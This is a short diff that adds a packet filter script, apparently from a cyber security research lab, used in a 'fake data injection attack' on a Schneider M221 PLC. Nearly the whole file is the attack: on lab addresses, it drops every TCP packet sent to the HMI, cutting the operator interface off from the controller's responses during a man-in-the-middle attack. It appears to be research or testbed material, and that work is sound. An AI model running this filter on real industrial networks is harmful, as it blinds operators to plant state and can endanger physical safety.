@@ -1,0 +1,17 @@
+#-----------------------------------------------------------------------------
+# Name:        m221_3 filter
+#
+# Purpose:     This filter is used to do the fake data injection attack for the 
+#              Schneider m221 PLC system.(IP 192.168.10.72)<-> 192.168.10.21
+# Author:      Yuancheng Liu
+#
+# Created:     2019/09/19
+# Copyright:   YC @ Singtel Cyber Security Research & Development Laboratory
+# License:     YC
+#-----------------------------------------------------------------------------
+
+if (ip.proto == TCP && ip.dst == '192.168.10.21') {
+    # block the communication to the HMI
+    drop();
+    msg("Drop the response!\n");
+}
